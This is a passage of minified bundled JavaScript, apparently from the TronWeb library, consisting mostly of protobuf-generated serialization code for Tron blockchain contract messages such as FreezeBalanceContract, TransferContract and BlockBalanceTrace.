                return h(this, e, !0)
            }
            ,
            i.prototype.rawListeners = function(e) {
                return h(this, e, !1)
            }
            ,
            i.listenerCount = function(e, t) {
                return "function" === typeof e.listenerCount ? e.listenerCount(t) : f.call(e, t)
            }
            ,
            i.prototype.listenerCount = f,
            i.prototype.eventNames = function() {
                return this._eventsCount > 0 ? t(this._events) : []
            }
        }
        ,
        7590: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                i.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[a-f0-9]{32}$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7642: (e, t, r) => {
            const n = r(77);
            e.exports = (e, t, r) => (e = new n(e,r),
            t = new n(t,r),
            e.intersects(t, r))
        }
        ,
        7647: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")()
              , s = r(4341);
            o.object.extend(proto, s),
            o.exportSymbol("TronWebProto.AccountBalanceRequest", null, i),
            o.exportSymbol("TronWebProto.AccountBalanceResponse", null, i),
            o.exportSymbol("TronWebProto.AccountIdentifier", null, i),
            o.exportSymbol("TronWebProto.AccountTrace", null, i),
            o.exportSymbol("TronWebProto.BlockBalanceTrace", null, i),
            o.exportSymbol("TronWebProto.BlockBalanceTrace.BlockIdentifier", null, i),
            o.exportSymbol("TronWebProto.CancelAllUnfreezeV2Contract", null, i),
            o.exportSymbol("TronWebProto.DelegateResourceContract", null, i),
            o.exportSymbol("TronWebProto.FreezeBalanceContract", null, i),
            o.exportSymbol("TronWebProto.FreezeBalanceV2Contract", null, i),
            o.exportSymbol("TronWebProto.TransactionBalanceTrace", null, i),
            o.exportSymbol("TronWebProto.TransactionBalanceTrace.Operation", null, i),
            o.exportSymbol("TronWebProto.TransferContract", null, i),
            o.exportSymbol("TronWebProto.UnDelegateResourceContract", null, i),
            o.exportSymbol("TronWebProto.UnfreezeBalanceContract", null, i),
            o.exportSymbol("TronWebProto.UnfreezeBalanceV2Contract", null, i),
            o.exportSymbol("TronWebProto.WithdrawBalanceContract", null, i),
            o.exportSymbol("TronWebProto.WithdrawExpireUnfreezeContract", null, i),
            TronWebProto.FreezeBalanceContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.FreezeBalanceContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.FreezeBalanceContract.displayName = "TronWebProto.FreezeBalanceContract"),
            TronWebProto.UnfreezeBalanceContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UnfreezeBalanceContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UnfreezeBalanceContract.displayName = "TronWebProto.UnfreezeBalanceContract"),
            TronWebProto.WithdrawBalanceContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.WithdrawBalanceContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.WithdrawBalanceContract.displayName = "TronWebProto.WithdrawBalanceContract"),
            TronWebProto.TransferContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.TransferContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.TransferContract.displayName = "TronWebProto.TransferContract"),
            TronWebProto.TransactionBalanceTrace = function(e) {
                n.Message.initialize(this, e, 0, -1, TronWebProto.TransactionBalanceTrace.repeatedFields_, null)
            }
            ,
            o.inherits(TronWebProto.TransactionBalanceTrace, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.TransactionBalanceTrace.displayName = "TronWebProto.TransactionBalanceTrace"),
            TronWebProto.TransactionBalanceTrace.Operation = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.TransactionBalanceTrace.Operation, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.TransactionBalanceTrace.Operation.displayName = "TronWebProto.TransactionBalanceTrace.Operation"),
            TronWebProto.BlockBalanceTrace = function(e) {
                n.Message.initialize(this, e, 0, -1, TronWebProto.BlockBalanceTrace.repeatedFields_, null)
            }
            ,
            o.inherits(TronWebProto.BlockBalanceTrace, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.BlockBalanceTrace.displayName = "TronWebProto.BlockBalanceTrace"),
            TronWebProto.BlockBalanceTrace.BlockIdentifier = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.BlockBalanceTrace.BlockIdentifier, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.BlockBalanceTrace.BlockIdentifier.displayName = "TronWebProto.BlockBalanceTrace.BlockIdentifier"),
            TronWebProto.AccountTrace = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountTrace, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountTrace.displayName = "TronWebProto.AccountTrace"),
            TronWebProto.AccountIdentifier = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountIdentifier, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountIdentifier.displayName = "TronWebProto.AccountIdentifier"),
            TronWebProto.AccountBalanceRequest = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountBalanceRequest, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountBalanceRequest.displayName = "TronWebProto.AccountBalanceRequest"),
            TronWebProto.AccountBalanceResponse = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountBalanceResponse, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountBalanceResponse.displayName = "TronWebProto.AccountBalanceResponse"),
            TronWebProto.FreezeBalanceV2Contract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.FreezeBalanceV2Contract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.FreezeBalanceV2Contract.displayName = "TronWebProto.FreezeBalanceV2Contract"),
            TronWebProto.UnfreezeBalanceV2Contract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UnfreezeBalanceV2Contract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UnfreezeBalanceV2Contract.displayName = "TronWebProto.UnfreezeBalanceV2Contract"),
            TronWebProto.WithdrawExpireUnfreezeContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.WithdrawExpireUnfreezeContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.WithdrawExpireUnfreezeContract.displayName = "TronWebProto.WithdrawExpireUnfreezeContract"),
            TronWebProto.DelegateResourceContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.DelegateResourceContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.DelegateResourceContract.displayName = "TronWebProto.DelegateResourceContract"),
            TronWebProto.UnDelegateResourceContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UnDelegateResourceContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UnDelegateResourceContract.displayName = "TronWebProto.UnDelegateResourceContract"),
            TronWebProto.CancelAllUnfreezeV2Contract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.CancelAllUnfreezeV2Contract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.CancelAllUnfreezeV2Contract.displayName = "TronWebProto.CancelAllUnfreezeV2Contract"),
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.FreezeBalanceContract.prototype.toObject = function(e) {
                return TronWebProto.FreezeBalanceContract.toObject(e, this)
            }
            ,
            TronWebProto.FreezeBalanceContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    frozenBalance: n.Message.getFieldWithDefault(t, 2, 0),
                    frozenDuration: n.Message.getFieldWithDefault(t, 3, 0),
                    resource: n.Message.getFieldWithDefault(t, 10, 0),
                    receiverAddress: t.getReceiverAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.FreezeBalanceContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.FreezeBalanceContract;
                return TronWebProto.FreezeBalanceContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.FreezeBalanceContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setFrozenBalance(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setFrozenDuration(r);
                        break;
                    case 10:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    case 15:
                        r = t.readBytes();
                        e.setReceiverAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.FreezeBalanceContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.FreezeBalanceContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getFrozenBalance()) && t.writeInt64(2, r),
                0 !== (r = e.getFrozenDuration()) && t.writeInt64(3, r),
                0 !== (r = e.getResource()) && t.writeEnum(10, r),
                (r = e.getReceiverAddress_asU8()).length > 0 && t.writeBytes(15, r)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getFrozenBalance = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.setFrozenBalance = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getFrozenDuration = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.setFrozenDuration = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 10, 0)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 10, e)
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress = function() {
                return n.Message.getFieldWithDefault(this, 15, "")
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getReceiverAddress())
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getReceiverAddress())
            }
            ,
            TronWebProto.FreezeBalanceContract.prototype.setReceiverAddress = function(e) {
                return n.Message.setProto3BytesField(this, 15, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.UnfreezeBalanceContract.prototype.toObject = function(e) {
                return TronWebProto.UnfreezeBalanceContract.toObject(e, this)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    resource: n.Message.getFieldWithDefault(t, 10, 0),
                    receiverAddress: t.getReceiverAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.UnfreezeBalanceContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.UnfreezeBalanceContract;
                return TronWebProto.UnfreezeBalanceContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 10:
                        r = t.readEnum();
                        e.setResource(r);
                        break;
                    case 15:
                        r = t.readBytes();
                        e.setReceiverAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.UnfreezeBalanceContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.UnfreezeBalanceContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getResource()) && t.writeEnum(10, r),
                (r = e.getReceiverAddress_asU8()).length > 0 && t.writeBytes(15, r)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getResource = function() {
                return n.Message.getFieldWithDefault(this, 10, 0)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.setResource = function(e) {
                return n.Message.setProto3EnumField(this, 10, e)
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress = function() {
                return n.Message.getFieldWithDefault(this, 15, "")
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getReceiverAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getReceiverAddress())
            }
            ,
            TronWebProto.UnfreezeBalanceContract.prototype.setReceiverAddress = function(e) {
                return n.Message.setProto3BytesField(this, 15, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.WithdrawBalanceContract.prototype.toObject = function(e) {
                return TronWebProto.WithdrawBalanceContract.toObject(e, this)
            }
            ,
            TronWebProto.WithdrawBalanceContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.WithdrawBalanceContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.WithdrawBalanceContract;
                return TronWebProto.WithdrawBalanceContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.WithdrawBalanceContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    if (1 === t.getFieldNumber()) {
                        var r = t.readBytes();
                        e.setOwnerAddress(r)
                    } else
                        t.skipField()
                }
                return e
            }
            ,
            TronWebProto.WithdrawBalanceContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.WithdrawBalanceContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.WithdrawBalanceContract.serializeBinaryToWriter = function(e, t) {
                var r;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r)
            }
            ,
            TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.WithdrawBalanceContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.TransferContract.prototype.toObject = function(e) {
                return TronWebProto.TransferContract.toObject(e, this)
            }
            ,
            TronWebProto.TransferContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    toAddress: t.getToAddress_asB64(),
                    amount: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.TransferContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.TransferContract;
                return TronWebProto.TransferContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.TransferContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setToAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setAmount(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.TransferContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.TransferContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.TransferContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getToAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getAmount()) && t.writeInt64(3, r)
            }
            ,
            TronWebProto.TransferContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.TransferContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.TransferContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.TransferContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.TransferContract.prototype.getToAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.TransferContract.prototype.getToAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getToAddress())
            }
            ,
            TronWebProto.TransferContract.prototype.getToAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getToAddress())
            }
            ,
            TronWebProto.TransferContract.prototype.setToAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.TransferContract.prototype.getAmount = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.TransferContract.prototype.setAmount = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.repeatedFields_ = [2],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.TransactionBalanceTrace.prototype.toObject = function(e) {
                return TronWebProto.TransactionBalanceTrace.toObject(e, this)
            }
            ,
            TronWebProto.TransactionBalanceTrace.toObject = function(e, t) {
                var r = {
                    transactionIdentifier: t.getTransactionIdentifier_asB64(),
                    operationList: n.Message.toObjectList(t.getOperationList(), TronWebProto.TransactionBalanceTrace.Operation.toObject, e),
                    type: n.Message.getFieldWithDefault(t, 3, ""),
                    status: n.Message.getFieldWithDefault(t, 4, "")
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.TransactionBalanceTrace.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.TransactionBalanceTrace;
                return TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setTransactionIdentifier(r);
                        break;
                    case 2:
                        r = new TronWebProto.TransactionBalanceTrace.Operation;
                        t.readMessage(r, TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader),
                        e.addOperation(r);
                        break;
                    case 3:
                        r = t.readString();
                        e.setType(r);
                        break;
                    case 4:
                        r = t.readString();
                        e.setStatus(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getTransactionIdentifier_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getOperationList()).length > 0 && t.writeRepeatedMessage(2, r, TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter),
                (r = e.getType()).length > 0 && t.writeString(3, r),
                (r = e.getStatus()).length > 0 && t.writeString(4, r)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.TransactionBalanceTrace.Operation.prototype.toObject = function(e) {
                return TronWebProto.TransactionBalanceTrace.Operation.toObject(e, this)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.toObject = function(e, t) {
                var r = {
                    operationIdentifier: n.Message.getFieldWithDefault(t, 1, 0),
                    address: t.getAddress_asB64(),
                    amount: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.TransactionBalanceTrace.Operation.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.TransactionBalanceTrace.Operation;
                return TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setOperationIdentifier(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setAmount(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getOperationIdentifier()) && t.writeInt64(1, r),
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getAmount()) && t.writeInt64(3, r)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.getOperationIdentifier = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.setOperationIdentifier = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.getAmount = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.TransactionBalanceTrace.Operation.prototype.setAmount = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier_asB64 = function() {
                return n.Message.bytesAsB64(this.getTransactionIdentifier())
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier_asU8 = function() {
                return n.Message.bytesAsU8(this.getTransactionIdentifier())
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.setTransactionIdentifier = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getOperationList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.TransactionBalanceTrace.Operation, 2)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.setOperationList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 2, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.addOperation = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 2, e, TronWebProto.TransactionBalanceTrace.Operation, t)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.clearOperationList = function() {
                return this.setOperationList([])
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.setType = function(e) {
                return n.Message.setProto3StringField(this, 3, e)
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.getStatus = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.TransactionBalanceTrace.prototype.setStatus = function(e) {
                return n.Message.setProto3StringField(this, 4, e)
            }
            ,
            TronWebProto.BlockBalanceTrace.repeatedFields_ = [3],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.BlockBalanceTrace.prototype.toObject = function(e) {
                return TronWebProto.BlockBalanceTrace.toObject(e, this)
            }
            ,
            TronWebProto.BlockBalanceTrace.toObject = function(e, t) {
                var r, o = {
                    blockIdentifier: (r = t.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(e, r),
                    timestamp: n.Message.getFieldWithDefault(t, 2, 0),
                    transactionBalanceTraceList: n.Message.toObjectList(t.getTransactionBalanceTraceList(), TronWebProto.TransactionBalanceTrace.toObject, e)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.BlockBalanceTrace.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.BlockBalanceTrace;
                return TronWebProto.BlockBalanceTrace.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.BlockBalanceTrace.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                        t.readMessage(r, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                        e.setBlockIdentifier(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setTimestamp(r);
                        break;
                    case 3:
                        r = new TronWebProto.TransactionBalanceTrace;
                        t.readMessage(r, TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader),
                        e.addTransactionBalanceTrace(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.BlockBalanceTrace.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.BlockBalanceTrace.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.BlockBalanceTrace.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                null != (r = e.getBlockIdentifier()) && t.writeMessage(1, r, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter),
                0 !== (r = e.getTimestamp()) && t.writeInt64(2, r),
                (r = e.getTransactionBalanceTraceList()).length > 0 && t.writeRepeatedMessage(3, r, TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.toObject = function(e) {
                return TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(e, this)
            }
            ,
            TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject = function(e, t) {
                var r = {
                    hash: t.getHash_asB64(),
                    number: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinary = function(e) {
